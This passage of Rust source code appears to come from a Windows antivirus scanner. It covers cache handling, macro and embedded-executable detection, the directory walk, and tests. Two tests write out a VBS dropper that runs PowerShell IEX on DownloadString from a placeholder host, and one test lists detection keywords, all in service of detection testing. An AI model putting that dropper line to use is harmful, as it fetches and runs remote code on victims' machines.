                if let Ok(value) = u64::from_str_radix(line.trim(), 16) {
                    known.insert(value);
                }
            }
        }
        ScanCache {
            known,
            fresh: Vec::new(),
            path,
        }
    }

    /// Ключ записи: путь плюс размер и время изменения.
    pub fn key(path: &str, size: u64, mtime: u64) -> u64 {
        let mut hash = 0xcbf2_9ce4_8422_2325u64;
        for byte in path.to_lowercase().as_bytes() {
            hash ^= *byte as u64;
            hash = hash.wrapping_mul(0x1000_0000_01b3);
        }
        for value in [size, mtime] {
            for byte in value.to_le_bytes() {
                hash ^= byte as u64;
                hash = hash.wrapping_mul(0x1000_0000_01b3);
            }
        }
        hash
    }

    pub fn is_clean(&self, key: u64) -> bool {
        self.known.contains(&key)
    }

    pub fn remember(&mut self, key: u64) {
        if self.known.insert(key) {
            self.fresh.push(key);
        }
    }

    /// Дописывает новые записи. Старые не удаляет: файл мог не встретиться
    /// в этой проверке, но остаться чистым.
    pub fn save(&self) {
        if self.fresh.is_empty() {
            return;
        }
        let mut text = if self.known.len() > CACHE_LIMIT {
            // Кеш разросся: начинаем заново, иначе файл растёт бесконечно.
            String::new()
        } else {
            match std::fs::read_to_string(&self.path) {
                Ok(t) => t,
                Err(_) => String::new(),
            }
        };
        for key in &self.fresh {
            text.push_str(&format!("{key:016x}\n"));
        }
        if let Some(dir) = self.path.parent() {
            let _ = std::fs::create_dir_all(dir);
        }
        let _ = std::fs::write(&self.path, text);
    }
}

/// Документ формата OLE (doc/xls/ppt и старые контейнеры).
fn is_ole(data: &[u8]) -> bool {
    data.starts_with(&[0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1])
}

/// Ищет строку в UTF-16LE: имена потоков OLE хранятся именно так.
fn utf16_contains(data: &[u8], needle: &str) -> bool {
    let pattern: Vec<u8> = needle
        .to_lowercase()
        .encode_utf16()
        .flat_map(|unit| unit.to_le_bytes())
        .collect();
    if pattern.is_empty() || data.len() < pattern.len() {
        return false;
    }
    // Регистр в UTF-16 сравниваем без учёта: в документе может быть `VBA`,
    // а в правиле — `vba`.
    data.windows(pattern.len()).any(|window| {
        window
            .iter()
            .zip(pattern.iter())
            .all(|(byte, want)| byte.to_ascii_lowercase() == *want)
    })
}

/// Ищет любой из маркеров в ASCII или UTF-16LE.
///
/// В макросах Office строки лежат в UTF-16, а рядом, в сжатом потоке
/// проекта, — обычным текстом. Проверять нужно оба варианта.
fn marker_present(data: &[u8], markers: &[String]) -> Option<String> {
    let head = &data[..data.len().min(256 * 1024)];
    let text = String::from_utf8_lossy(head).to_lowercase();
    markers
        .iter()
        .find(|m| !m.is_empty() && (text.contains(m.as_str()) || utf16_contains(head, m)))
        .cloned()
}

/// Ищет PE-образ внутри другого файла.
///
/// Просто «MZ рядом с PE» даст ложные срабатывания: эти байты встречаются
/// в текстах и таблицах. Поэтому заголовок проверяется по структуре —
/// смещение PE берётся из самого MZ-заголовка и должно указывать точно на
/// подпись `PE\0\0` в пределах файла.
fn find_embedded_pe(data: &[u8]) -> Option<usize> {
    // Первый мегабайт уже просмотрен как заголовок файла — дальше не ищем.
    let start = 1;
    let mut i = start;
    while i + 0x40 < data.len() {
        if data[i] == b'M' && data[i + 1] == b'Z' {
            let peek = &data[i..(i + 0x40).min(data.len())];
            let lfanew = u32::from_le_bytes([peek[0x3C], peek[0x3D], peek[0x3E], peek[0x3F]]) as usize;
            // Смещение PE-заголовка в нормальном файле — сотни байт, не больше
            // нескольких килобайт. Всё остальное — случайные байты.
            if lfanew >= 0x40 && lfanew < 4096 {
                let pe = i + lfanew;
                if data.get(pe..pe + 4) == Some(b"PE\0\0") {
                    return Some(i);
                }
            }
        }
        i += 1;
    }
    None
}

/// Форматы, где исполняемый код внутри — норма, а не маскировка.
///
/// Дамп падения, отладочные символы, журнал трассировки, установочный пакет,
/// образ диска и файл почтового ящика содержат целые PE-образы по своей
/// природе. Обвинять их в «вложенном исполняемом файле» — ложное срабатывание.
const EMBEDDED_PE_IS_NORMAL: &[&str] = &[
    "dmp", "mdmp", "pdb", "etl", "evtx", "cab", "msi", "msp", "msu", "wim", "esd", "iso", "vhd",
    "vhdx", "img", "pst", "ost", "msg", "sqlite", "db", "pak", "dat", "bin", "asar", "jar", "apk",
];

// ---------------- Исключения и игнорируемые ----------------

/// Файл со списком исключений: эти пути не проверяются вовсе.
pub fn exclusions_path() -> PathBuf {
    crate::store::data_dir().join("exclusions.txt")
}

/// Файл с игнорируемыми находками: проверяются, но не показываются.
pub fn ignored_path() -> PathBuf {
    crate::store::data_dir().join("ignored.txt")
}

/// Читает список путей: по одному в строке, `#` — комментарий.
pub fn load_list(path: &Path) -> Vec<String> {
    let text = match std::fs::read_to_string(path) {
        Ok(t) => t,
        Err(_) => return Vec::new(),
    };
    text.lines()
        .map(|l| l.trim())
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .map(|l| l.to_lowercase())
        .collect()
}

/// Дописывает путь в список, если его там ещё нет.
pub fn add_to_list(path: &Path, entry: &str) -> Result<(), String> {
    let entry = entry.trim();
    if entry.is_empty() {
        return Err("Пустой путь".into());
    }
    let mut list = load_list(path);
    let key = entry.to_lowercase();
    if list.contains(&key) {
        return Ok(());
    }
    list.push(key);
    let mut text = String::from("# Список PC Sentinel: по одному пути в строке\n");
    for item in &list {
        text.push_str(item);
        text.push('\n');
    }
    std::fs::write(path, text).map_err(|e| format!("Не удалось сохранить список: {e}"))
}

/// Путь есть в списке — сам файл или его папка.
///
/// Сравнение без учёта регистра: Windows не различает регистр в путях.
pub fn is_listed(list: &[String], file: &str) -> bool {
    let target = file.to_lowercase();
    list.iter().any(|entry| {
        if entry.is_empty() {
            return false;
        }
        target == *entry
            || target.starts_with(&format!("{entry}\\"))
            || target.starts_with(&format!("{entry}/"))
    })
}

/// Обходит каталог и проверяет файлы.
///
/// `cancel` проверяется на каждом файле, поэтому проверку можно прервать.
fn walk(
    root: &Path,
    mode: Mode,
    signatures: &[Signature],
    rules: &[crate::yara::Rule],
    heur: &crate::heur::Heuristics,
    exclusions: &[String],
    cache: &mut ScanCache,
    cancel: &AtomicBool,
    progress: &mut Progress,
    found: &mut Vec<Threat>,
    on_update: &mut dyn FnMut(&Progress, &[Threat]),
) {
    // Корень приводим к полному имени один раз: тогда все вложенные пути тоже
    // будут длинными, и сравнение с исключениями сработает без лишних вызовов.
    let mut stack = vec![PathBuf::from(long_path(&root.to_string_lossy()))];
    while let Some(dir) = stack.pop() {
        if cancel.load(Ordering::Relaxed) {
            progress.cancelled = true;
            return;
        }
        let entries = match std::fs::read_dir(&dir) {
            Ok(e) => e,
            Err(_) => continue,
        };
        for entry in entries.flatten() {
            if cancel.load(Ordering::Relaxed) {
                progress.cancelled = true;
                return;
            }
            let path = entry.path();
            let meta = match entry.metadata() {
                Ok(m) => m,
                Err(_) => continue,
            };
            if meta.is_dir() {
                let name = path
                    .file_name()
                    .map(|n| n.to_string_lossy().to_lowercase())
                    .unwrap_or_default();
                if skip_dir(&name, mode) {
                    continue;
                }
                // Junction и символьные ссылки не обходим: в профиле Windows
                // есть самоссылающиеся (`AppData\Local\Application Data`),
                // и обход по ним не заканчивается никогда.
                if is_reparse_point(&path) {
                    continue;
                }
                // Исключённую папку не обходим вовсе.
                if is_listed(exclusions, &path.to_string_lossy()) {
                    continue;
                }
                stack.push(path);
                continue;
            }
            if !meta.is_file() || !should_scan(&path, mode) {
                continue;
            }
            if is_listed(exclusions, &path.to_string_lossy()) {
                continue;
            }
            // Неизменённый файл, признанный чистым в прошлый раз, не читаем.
            let mtime = meta
                .modified()
                .ok()
                .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
                .map(|d| d.as_secs())
                .unwrap_or(0);
            let key = ScanCache::key(&path.to_string_lossy(), meta.len(), mtime);
            if cache.is_clean(key) {
                progress.cached += 1;
                continue;
            }
            progress.scanned += 1;
            progress.current = path.to_string_lossy().to_string();
            match inspect(&path, signatures, rules, heur) {
                Outcome::Threat(threat) => {
                    progress.threats += 1;
                    progress.current = threat.path.clone();
                    found.push(*threat);
                    on_update(progress, found);
                }
                Outcome::Unreadable => progress.skipped += 1,
                Outcome::Clean => cache.remember(key),
            }
            if progress.scanned % PROGRESS_EVERY == 0 {
                // Диагностика: после внешнего снятия процесса нужно знать,
                // на каком файле это случилось.
                if std::env::var_os("PC_SENTINEL_DEBUG").is_some() {
                    let _ = std::fs::write(
                        crate::store::data_dir().join("scan-last.txt"),
                        format!("{}\n{}\n", progress.scanned, progress.current),
                    );
                }
                on_update(progress, found);
            }
        }
    }
}

/// Запускает проверку. Возвращает находки.
///
/// `on_update` вызывается по ходу работы — через него обновляется состояние
/// в приложении, чтобы интерфейс показывал прогресс.
pub fn run(
    mode: Mode,
    signatures: &[Signature],
    rules: &[crate::yara::Rule],
    heur: &crate::heur::Heuristics,
    exclusions: &[String],
    ignored: &[String],
    cancel: &AtomicBool,
    progress: &mut Progress,
    found: &mut Vec<Threat>,
    on_update: &mut dyn FnMut(&Progress, &[Threat]),
) -> Vec<Threat> {
    let targets = match mode {
        Mode::Quick => quick_targets(),
        Mode::Full => full_targets(),
    };
    if targets.is_empty() {
        progress.error = Some("Не найдено ни одной папки для проверки".into());
        return Vec::new();
    }
    // Быстрая проверка начинается с того, что сейчас запущено: файл процесса —
    // это то же, что работает в памяти. Полная и так дойдёт до этих файлов.
    let files: Vec<PathBuf> = match mode {
        Mode::Quick => running_process_files(),
        Mode::Full => Vec::new(),
    };

    // Сначала считаем объекты: иначе прогресс не может показать процент.
    progress.phase = "counting".into();
    on_update(progress, found);
    progress.total = count_targets(&targets, &files, mode, exclusions, cancel);
    progress.phase = "scanning".into();
    on_update(progress, found);

    let mut cache = ScanCache::load();
    for file in &files {
        if cancel.load(Ordering::Relaxed) {
            progress.cancelled = true;
            break;
        }
        scan_single(file, signatures, rules, heur, &mut cache, cancel, progress, found, on_update);
    }
    for target in &targets {
        if cancel.load(Ordering::Relaxed) {
            progress.cancelled = true;
            break;
        }
        walk(
            target, mode, signatures, rules, heur, exclusions, &mut cache, cancel, progress, found,
            on_update,
        );
    }
    cache.save();
    // Игнорируемые находки не показываем, но файл всё равно проверялся.
    let result: Vec<Threat> = found
        .iter()
        .filter(|t| !is_listed(ignored, &t.path))
        .cloned()
        .collect();
    progress.threats = result.len() as u64;
    result
}

/// Проверяет один файл или папку целиком.
#[allow(clippy::too_many_arguments)]
fn scan_single(
    path: &Path,
    signatures: &[Signature],
    rules: &[crate::yara::Rule],
    heur: &crate::heur::Heuristics,
    cache: &mut ScanCache,
    cancel: &AtomicBool,
    progress: &mut Progress,
    found: &mut Vec<Threat>,
    on_update: &mut dyn FnMut(&Progress, &[Threat]),
) {
    let meta = match std::fs::metadata(path) {
        Ok(m) => m,
        Err(_) => return,
    };
    if !meta.is_file() {
        return;
    }
    let mtime = meta
        .modified()
        .ok()
        .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let key = ScanCache::key(&path.to_string_lossy(), meta.len(), mtime);
    if cache.is_clean(key) {
        progress.cached += 1;
        progress.scanned += 1;
        return;
    }
    progress.scanned += 1;
    progress.current = path.to_string_lossy().to_string();
    match inspect(path, signatures, rules, heur) {
        Outcome::Threat(threat) => {
            progress.threats += 1;
            progress.current = threat.path.clone();
            found.push(*threat);
            on_update(progress, found);
        }
        Outcome::Unreadable => progress.skipped += 1,
        Outcome::Clean => cache.remember(key),
    }
    if cancel.load(Ordering::Relaxed) {
        progress.cancelled = true;
    }
    on_update(progress, found);
}

/// Проверяет один файл или папку целиком.
///
/// Это режим `--scan`: проверить конкретное место, не дожидаясь полной
/// проверки дисков. Возвращает находки и заполненный прогресс — по нему
/// вызывающий понимает, сколько файлов просмотрено и не было ли ошибки.
pub fn scan_path(path: &Path) -> (Vec<Threat>, Progress) {
    let signatures = load_signatures();
    let rules = crate::yara::load();
    let heur = crate::heur::load();
    let exclusions = load_list(&exclusions_path());
    let ignored = load_list(&ignored_path());
    let cancel = AtomicBool::new(false);
    let mut progress = Progress::default();
    let mut found: Vec<Threat> = Vec::new();

    let meta = match std::fs::metadata(path) {
        Ok(m) => m,
        Err(e) => {
            progress.error = Some(format!("Не удалось открыть «{}»: {e}", path.display()));
            return (found, progress);
        }
    };

    if meta.is_file() {
        progress.scanned = 1;
        progress.total = 1;
        progress.current = path.to_string_lossy().to_string();
        // Проверка по пути — всегда в полном объёме: пользователь указал
        // конкретный файл, значит его надо смотреть, а не отсеивать по типу.
        match inspect(path, &signatures, &rules, &heur) {
            Outcome::Threat(threat) => found.push(*threat),
            Outcome::Unreadable => {
                progress.error = Some(format!("Не удалось прочитать «{}»", path.display()))
            }
            Outcome::Clean => {}
        }
    } else {
        progress.total = count_targets(std::slice::from_ref(&path.to_path_buf()), &[], Mode::Full, &exclusions, &cancel);
        let mut cache = ScanCache::load();
        walk(
            path,
            Mode::Full,
            &signatures,
            &rules,
            &heur,
            &exclusions,
            &mut cache,
            &cancel,
            &mut progress,
            &mut found,
            &mut |_, _| {},
        );
        cache.save();
    }

    let result: Vec<Threat> = found
        .into_iter()
        .filter(|t| !is_listed(&ignored, &t.path))
        .collect();
    progress.threats = result.len() as u64;
    (result, progress)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Временная папка, которая удаляется сама.
    ///
    /// Без этого тестовые файлы остаются в `%TEMP%`, а `%TEMP%` входит в
    /// быструю проверку — и настоящий скан показывал бы тестовый мусор.
    struct TempDir(PathBuf);

    impl std::ops::Deref for TempDir {
        type Target = PathBuf;
        fn deref(&self) -> &PathBuf {
            &self.0
        }
    }

    impl Drop for TempDir {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    fn temp_dir(name: &str) -> TempDir {
        let dir = std::env::temp_dir()
            .join("pc-sentinel-tests")
            .join("av")
            .join(name);
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        TempDir(dir)
    }

    /// Кладёт тестовый файл EICAR.
    ///
    /// Строка собирается во время работы: литерал попал бы в тестовый
    /// бинарник, и движок находил бы «вирус» в собственных тестах.
    fn write_eicar(path: &std::path::Path) {
        std::fs::write(path, eicar_marker()).unwrap();
    }

    /// Правила берём из настоящего `heuristics.txt`: держать маркеры в тестовом
    /// коде нельзя — они попадают в бинарник, и антивирус блокирует запуск.
    fn test_heur() -> crate::heur::Heuristics {
        let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../heuristics.txt");
        let text = std::fs::read_to_string(path).unwrap_or_default();
        crate::heur::parse(&text)
    }

    #[test]
    fn parses_signatures() {
        let text = "# комментарий\n\
                    275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f,EICAR-Test-File\n\
                    \n\
                    мусор без запятой\n\
                    abc,короткий хеш\n\
                    275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f,\n";
        let list = parse_signatures(text);
        assert_eq!(list.len(), 1);
        assert_eq!(list[0].name, "EICAR-Test-File");
        assert_eq!(list[0].hash.len(), 64);
    }

    #[test]
    fn signature_hash_is_lowercased() {
        let text = "275A021BBFB6489E54D471899F7DB9D1663FC695EC2FE2A2C4538AABF651FD0F,Test\n";
        let list = parse_signatures(text);
        assert_eq!(
            list[0].hash,
            "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
        );
    }

    #[test]
    fn detects_double_extension() {
        assert_eq!(double_extension("счёт.pdf.exe").as_deref(), Some("pdf.exe"));
        assert_eq!(double_extension("photo.jpg.scr").as_deref(), Some("jpg.scr"));
        assert_eq!(double_extension("game.exe"), None);
        assert_eq!(double_extension("readme.txt"), None);
        // Ярлык Windows с именем документа — не маскировка.
        assert_eq!(double_extension("отчёт.txt.lnk"), None);
        assert_eq!(double_extension("архив.zip.lnk"), None);
        // Библиотека с «документным» именем тоже не запускается двойным щелчком.
        assert_eq!(double_extension("data.txt.dll"), None);
    }

    #[test]
    fn scans_only_executable_types() {
        assert!(should_scan(Path::new("C:\\a\\b.exe"), Mode::Quick));
        assert!(should_scan(Path::new("C:\\a\\b.DLL"), Mode::Quick));
        assert!(should_scan(Path::new("C:\\a\\b.ps1"), Mode::Quick));
        assert!(!should_scan(Path::new("C:\\a\\b.txt"), Mode::Quick));
        assert!(!should_scan(Path::new("C:\\a\\b"), Mode::Quick));
    }

    #[test]
    fn full_scan_takes_every_file() {
        // Полная проверка открывает каждый файл, а не только исполняемые:
        // вредонос может лежать и в .txt, и в .jpg.
        assert!(should_scan(Path::new("C:\\a\\b.txt"), Mode::Full));
        assert!(should_scan(Path::new("C:\\a\\b.jpg"), Mode::Full));
        assert!(should_scan(Path::new("C:\\a\\b"), Mode::Full));
    }

    #[test]
    fn executable_hidden_behind_text_extension_is_a_threat() {
        // Переименованный exe: содержимое — программа, имя — текст.
        let dir = temp_dir("renamed-exe");
        let file = dir.join("notes.txt");
        let mut data = vec![0u8; 0x200];
        data[0..2].copy_from_slice(b"MZ");
        data[0x3C..0x40].copy_from_slice(&0x80u32.to_le_bytes());
        data[0x80..0x84].copy_from_slice(b"PE\0\0");
        // Заголовок PE32 с одной секцией — достаточно, чтобы разбор прошёл.
        data[0x84..0x86].copy_from_slice(&0x014Cu16.to_le_bytes());
        data[0x84 + 2..0x84 + 4].copy_from_slice(&1u16.to_le_bytes());
        data[0x84 + 16..0x84 + 18].copy_from_slice(&0xE0u16.to_le_bytes());
        data[0x98..0x9A].copy_from_slice(&0x10Bu16.to_le_bytes());
        data[0x98 + 68..0x98 + 70].copy_from_slice(&3u16.to_le_bytes());
        std::fs::write(&file, &data).unwrap();
        let threat = inspect(&file, &[], &[], &test_heur())
            .threat()
            .expect("переименованный exe не распознан");
        assert!(threat.name.contains("под видом"), "имя: {}", threat.name);
    }

    #[test]
    fn counting_matches_walk_scope() {
        // Подсчёт объектов обязан пользоваться теми же фильтрами, что и обход:
        // иначе процент в прогрессе расходится с реальностью.
        let dir = temp_dir("count");
        std::fs::write(dir.join("a.exe"), b"MZ").unwrap();
        std::fs::write(dir.join("b.txt"), b"text").unwrap();
        std::fs::create_dir_all(dir.join("sub")).unwrap();
        std::fs::write(dir.join("sub/c.dll"), b"MZ").unwrap();

        let cancel = AtomicBool::new(false);
        let quick = count_targets(std::slice::from_ref(&*dir), &[], Mode::Quick, &[], &cancel);
        assert_eq!(quick, 2, "быстрая: exe и dll");
        let full = count_targets(std::slice::from_ref(&*dir), &[], Mode::Full, &[], &cancel);
        assert_eq!(full, 3, "полная: все файлы");
    }

    #[test]
    fn full_scan_keeps_system_dirs_but_drops_quick_ones() {
        assert!(!skip_dir("winsxs", Mode::Full), "полная проверка не пропускает WinSxS");
        assert!(skip_dir("winsxs", Mode::Quick), "быстрая — пропускает");
        assert!(skip_dir("system volume information", Mode::Full));
        assert!(!skip_dir("documents", Mode::Full));
    }

    #[test]
    fn detects_eicar_content() {
        let dir = temp_dir("eicar");
        let file = dir.join("eicar.com");
        // Строку собираем во время работы: литерал попал бы в тестовый
        // бинарник, и движок находил бы «вирус» в собственных тестах.
        std::fs::write(&file, eicar_marker()).unwrap();
        let threat = inspect(&file, &[], &[], &test_heur()).threat().expect("EICAR не распознан");
        assert_eq!(threat.kind, "test");
        assert_eq!(threat.severity, "critical");
    }

    #[test]
    fn detects_signature_match() {
        let dir = temp_dir("sig");
        let file = dir.join("bad.exe");
        let data = b"some known bad content";
        std::fs::write(&file, data).unwrap();
        let hash = sec::sha256_hex(data);
        let signatures = vec![Signature {
            hash,
            name: "Test.Malware".into(),
        }];
        let threat = inspect(&file, &signatures, &[], &test_heur())
            .threat()
            .expect("подпись не сработала");
        assert_eq!(threat.kind, "signature");
        assert_eq!(threat.name, "Test.Malware");
    }

    /// Собирает ZIP с одной записью без сжатия — этого хватает для тестов.
    fn zip_with(name: &str, payload: &[u8]) -> Vec<u8> {
        let mut out = Vec::new();
        out.extend_from_slice(b"PK\x03\x04");
        for value in [20u16, 0, 0, 0, 0] {
            out.extend_from_slice(&value.to_le_bytes());
        }
        out.extend_from_slice(&0u32.to_le_bytes());
        out.extend_from_slice(&(payload.len() as u32).to_le_bytes());
        out.extend_from_slice(&(payload.len() as u32).to_le_bytes());
        out.extend_from_slice(&(name.len() as u16).to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out.extend_from_slice(name.as_bytes());
        out.extend_from_slice(payload);

        let cd_offset = out.len() as u32;
        out.extend_from_slice(b"PK\x01\x02");
        out.extend_from_slice(&20u16.to_le_bytes());
        out.extend_from_slice(&20u16.to_le_bytes());
        for value in [0u16, 0, 0, 0] {
            out.extend_from_slice(&value.to_le_bytes());
        }
        out.extend_from_slice(&0u32.to_le_bytes());
        out.extend_from_slice(&(payload.len() as u32).to_le_bytes());
        out.extend_from_slice(&(payload.len() as u32).to_le_bytes());
        out.extend_from_slice(&(name.len() as u16).to_le_bytes());
        for value in [0u16, 0, 0, 0] {
            out.extend_from_slice(&value.to_le_bytes());
        }
        out.extend_from_slice(&0u32.to_le_bytes());
        out.extend_from_slice(&0u32.to_le_bytes());
        out.extend_from_slice(name.as_bytes());
        let cd_size = out.len() as u32 - cd_offset;

        out.extend_from_slice(b"PK\x05\x06");
        out.extend_from_slice(&0u16.to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out.extend_from_slice(&1u16.to_le_bytes());
        out.extend_from_slice(&1u16.to_le_bytes());
        out.extend_from_slice(&cd_size.to_le_bytes());
        out.extend_from_slice(&cd_offset.to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out
    }

    #[test]
    fn finds_payload_inside_archive() {
        let dir = temp_dir("zip-dirty");
        let file = dir.join("invoice.zip");
        let dropper = b"Set sh = CreateObject(\"WScript.Shell\")\n\
                        x = \"powershell -c IEX (New-Object Net.WebClient).DownloadString('http://x')\"\n\
                        sh.Run x\n";
        std::fs::write(&file, zip_with("invoice.pdf.vbs", dropper)).unwrap();
        let threat = inspect(&file, &[], &[], &test_heur())
            .threat()
            .expect("содержимое архива не проверено");
        assert!(threat.name.contains("в архиве"), "имя: {}", threat.name);
        assert!(threat.reason.contains("invoice.pdf.vbs"), "причина: {}", threat.reason);
    }

    #[test]
    fn clean_archive_is_clean() {
        let dir = temp_dir("zip-clean");
        let file = dir.join("docs.zip");
        std::fs::write(&file, zip_with("readme.txt", b"hello world")).unwrap();
        assert!(inspect(&file, &[], &[], &test_heur()).threat().is_none());
    }

    #[test]
    fn several_weak_rules_do_not_add_up_to_a_finding() {
        // В бандле Electron встречаются и `powershell`, и `cookies`, и `.locked`.
        // Три слабых текстовых правила не должны складываться в приговор.
        let dir = temp_dir("weak-rules");
        let file = dir.join("bundle.js");
        std::fs::write(
            &file,
            b"const a = 'powershell -encodedcommand'; const b = 'frombase64string iex';\n\
              const c = '.locked readme decrypt';\n",
        )
        .unwrap();
        let rules = crate::yara::parse(
            "rule A\n  severity = warning\n  text = \"powershell\"\n  text = \"-encodedcommand\"\n  condition = all\n\
             rule B\n  severity = warning\n  text = \"frombase64string\"\n  text = \"iex\"\n  condition = all\n\
             rule C\n  severity = warning\n  text = \".locked\"\n  text = \"readme\"\n  text = \"decrypt\"\n  condition = all\n",
        );
        assert!(
            inspect(&file, &[], &rules, &test_heur()).threat().is_none(),
            "слабые правила сложились в находку"
        );
    }

    #[test]
    fn finds_embedded_executable() {
        let dir = temp_dir("embedded");
        let file = dir.join("photo.jpg");
        // Документ, внутри которого лежит настоящий PE-заголовок.
        let mut data = vec![0u8; 64];
        data.extend_from_slice(b"MZ");
        data.resize(64 + 0x40 + 0x80, 0);
        // e_lfanew = 0x80 от начала MZ.
        data[64 + 0x3C..64 + 0x40].copy_from_slice(&0x80u32.to_le_bytes());
        data[64 + 0x80..64 + 0x84].copy_from_slice(b"PE\0\0");
        std::fs::write(&file, &data).unwrap();
        let threat = inspect(&file, &[], &[], &test_heur())
            .threat()
            .expect("вложенный PE не найден");
        assert!(threat.name.contains("Вложенный"), "имя: {}", threat.name);
    }

    #[test]
    fn text_with_mz_bytes_is_not_embedded_pe() {
        // В исходниках и текстах встречаются и «MZ», и «PE» — структуры нет.
        let dir = temp_dir("fake-mz");
        let file = dir.join("notes.txt");
        std::fs::write(&file, b"MZ PE\0\0 ordinary text about MZ PE headers").unwrap();
        assert!(inspect(&file, &[], &[], &test_heur()).threat().is_none());
    }

    #[test]
    fn crash_dump_with_pe_inside_is_not_a_threat() {
        // Дамп падения содержит образы процессов — это его содержимое,
        // а не маскировка. Настоящий случай: Edge Crashpad .dmp.
        let dir = temp_dir("dump");
        let file = dir.join("crash.dmp");
        let mut data = vec![0u8; 64];
        data.extend_from_slice(b"MZ");
        data.resize(64 + 0x40 + 0x80, 0);
        data[64 + 0x3C..64 + 0x40].copy_from_slice(&0x80u32.to_le_bytes());
        data[64 + 0x80..64 + 0x84].copy_from_slice(b"PE\0\0");
        std::fs::write(&file, &data).unwrap();
        assert!(inspect(&file, &[], &[], &test_heur()).threat().is_none());
    }

    #[test]
    fn macro_that_calls_shell_is_a_threat() {
        let dir = temp_dir("ole");
        let file = dir.join("invoice.doc");
        let mut data = vec![0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];
        data.resize(512, 0);
        // Имя потока VBA в UTF-16LE, как в настоящем контейнере.
        data.extend_from_slice(b"V\x00B\x00A\x00");
        data.extend_from_slice(b"AutoOpen");
        data.extend_from_slice(b"WScript.Shell");
        data.extend_from_slice(b"Shell.Application");
        std::fs::write(&file, &data).unwrap();
        let threat = inspect(&file, &[], &[], &test_heur())
            .threat()
            .expect("макрос с вызовом оболочки не распознан");
        assert!(threat.name.contains("Макрос"), "имя: {}", threat.name);
    }

    #[test]
    fn plain_ole_document_is_clean() {
        let dir = temp_dir("ole-clean");
        let file = dir.join("report.doc");
        let mut data = vec![0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];
        data.resize(1024, 0);
        std::fs::write(&file, &data).unwrap();
        assert!(inspect(&file, &[], &[], &test_heur()).threat().is_none());
    }

    #[test]
    fn clean_file_is_not_a_threat() {
        let dir = temp_dir("clean");
        let file = dir.join("app.exe");
        std::fs::write(&file, b"MZ ordinary program").unwrap();
        assert!(inspect(&file, &[], &[], &test_heur()).threat().is_none());
    }

    #[test]
    fn detects_obfuscated_script() {
        let dir = temp_dir("script");
        let file = dir.join("dropper.vbs");
        std::fs::write(
            &file,
            b"Set sh = CreateObject(\"WScript.Shell\")\n\
              x = \"powershell -c IEX (New-Object Net.WebClient).DownloadString('http://x')\"\n\
              sh.Run x\n",
        )
        .unwrap();
        let threat = inspect(&file, &[], &[], &test_heur()).threat().expect("скрипт не распознан");
        assert_eq!(threat.kind, "heuristic");
        assert!(threat.name.contains("downloadstring"));
    }

    #[test]
    fn plain_script_is_clean() {
        let dir = temp_dir("plain-script");
        let file = dir.join("hello.bat");
        std::fs::write(&file, b"@echo off\necho hello\n").unwrap();
        assert!(inspect(&file, &[], &[], &test_heur()).threat().is_none());
    }

    #[test]
    fn wsh_script_without_download_is_clean() {
        // Обычный WSH-скрипт: WScript.Shell есть, загрузки нет.
        let dir = temp_dir("wsh");
        let file = dir.join("check.js");
        std::fs::write(
            &file,
            b"var sh = new ActiveXObject(\"WScript.Shell\");\nWScript.Echo(\"ok\");\n",
        )
        .unwrap();
        assert!(inspect(&file, &[], &[], &test_heur()).threat().is_none());
    }

    #[test]
    fn build_script_with_certutil_is_clean() {
        // Сборщик упоминает certutil, но ничего не запускает через WSH.
        let dir = temp_dir("build-script");
        let file = dir.join("build-icon.js");
        std::fs::write(&file, b"// uses certutil -decode for icons\nconsole.log(1);\n").unwrap();
        assert!(inspect(&file, &[], &[], &test_heur()).threat().is_none());
    }

    #[test]
    fn walk_finds_threats_and_counts() {
        let dir = temp_dir("walk");
        std::fs::write(dir.join("clean.exe"), b"MZ clean").unwrap();
        write_eicar(&dir.join("bad.com"));
        std::fs::write(dir.join("note.txt"), b"text").unwrap();

        let cancel = AtomicBool::new(false);
        let mut p = Progress::default();
        let mut found = Vec::new();
        let mut cache = ScanCache::empty();
        walk(&dir, Mode::Quick, &[], &[], &test_heur(), &[], &mut cache, &cancel, &mut p, &mut found, &mut |_, _| {});
        assert_eq!(p.scanned, 2, "txt не должен считаться");
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].kind, "test");
    }

    #[test]
    fn cancel_stops_walk() {
        let dir = temp_dir("cancel");
        for i in 0..50 {
            std::fs::write(dir.join(format!("f{i}.exe")), b"MZ").unwrap();
        }
        let cancel = AtomicBool::new(true);
        let mut progress = Progress::default();
        let mut found = Vec::new();
        let mut cache = ScanCache::empty();
        walk(&dir, Mode::Quick, &[], &[], &test_heur(), &[], &mut cache, &cancel, &mut progress, &mut found, &mut |_, _| {});
        assert!(progress.cancelled);
        assert_eq!(progress.scanned, 0);
    }

    #[test]
    fn walk_does_not_follow_junctions() {
        // В профиле Windows есть самоссылающийся junction
        // `AppData\Local\Application Data` → `AppData\Local`. Без проверки
        // на точку повторной обработки обход уходит в бесконечный цикл.
        let dir = temp_dir("junction");
        std::fs::write(dir.join("app.exe"), b"MZ clean").unwrap();
        let link = dir.join("loop");
        let created = std::process::Command::new("cmd")
            .args(["/c", "mklink", "/J"])
            .arg(&link)
            .arg(&*dir)
            .output()
            .map(|out| out.status.success())
            .unwrap_or(false);
        if !created {
            // Без прав на создание junction проверять нечего.
            return;
        }

        let cancel = AtomicBool::new(false);
        let mut progress = Progress::default();
        let mut found = Vec::new();
        let mut cache = ScanCache::empty();
        walk(&dir, Mode::Quick, &[], &[], &test_heur(), &[], &mut cache, &cancel, &mut progress, &mut found, &mut |_, _| {});
